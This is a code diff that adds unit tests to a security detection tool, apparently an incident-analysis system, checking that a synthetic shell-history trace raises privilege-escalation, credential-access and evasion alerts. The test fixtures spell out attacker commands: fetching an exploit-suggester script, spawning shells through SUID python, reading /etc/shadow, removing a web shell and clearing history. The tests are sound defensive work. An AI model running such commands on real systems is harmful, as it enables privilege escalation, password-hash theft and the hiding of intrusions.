@@ -115,6 +115,50 @@ class DetectionRegressionTests(unittest.TestCase):
         self.assertTrue(any(alert.rule_id == "CN-HVV-001" for alert in summary.alerts))
         self.assertTrue(any("cn-hvv" in event.tags for event in result.events))
 
+    def test_shell_history_command_trace_creates_actionable_alerts(self):
+        content = "\n".join([
+            "whoami",
+            "wget https://example.test/linux-exploit-suggester.sh -O les.sh",
+            "python -c 'import pty; pty.spawn(\"/bin/sh\")'",
+            "sudo -l",
+            "find / -type f -user root -perm -4000 2>/dev/null",
+            "./usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+            "cat /etc/shadow",
+            "rm /var/www/html/uploads/x.phtml",
+        ]) + "\n"
+
+        result = parse_shell_history(content, ".bash_history")
+        summary = run_detection(result.events)
+        rule_ids = {alert.rule_id for alert in summary.alerts}
+
+        self.assertIn("PRIV-005", rule_ids)
+        self.assertIn("EXEC-003", rule_ids)
+        self.assertIn("EXEC-004", rule_ids)
+        self.assertIn("CRED-003", rule_ids)
+        self.assertIn("EVAS-003", rule_ids)
+        phases = {item.phase for item in summary.attack_chain}
+        self.assertIn("权限提升", phases)
+        self.assertIn("凭据访问", phases)
+        self.assertIn("防御规避", phases)
+        self.assertEqual({event.details.get("source_type") for event in result.events}, {"shell-history"})
+
+    def test_shell_history_incident_subject_is_actionable_without_asset_context(self):
+        content = "cat /etc/shadow\nhistory -c\n"
+        result = parse_shell_history(content, ".bash_history")
+        summary = run_detection(result.events)
+
+        self.assertTrue(summary.incidents)
+        titles = "\n".join(incident.title for incident in summary.incidents)
+        descriptions = "\n".join(incident.description for incident in summary.incidents)
+        evidence = "\n".join(item for incident in summary.incidents for item in incident.evidence)
+
+        self.assertIn("Shell", titles)
+        self.assertNotIn("未知实体", titles)
+        self.assertNotIn("未知来源", descriptions)
+        self.assertIn("关键命令", descriptions)
+        self.assertIn("证据类型: Shell 命令历史", evidence)
+        self.assertEqual({incident.confidence for incident in summary.incidents}, {"medium"})
+
     def test_allowlist_suppresses_trusted_noise_before_detection(self):
         content = (
             "10.0.0.5 - - [15/Mar/2024:10:00:00 +0800] "
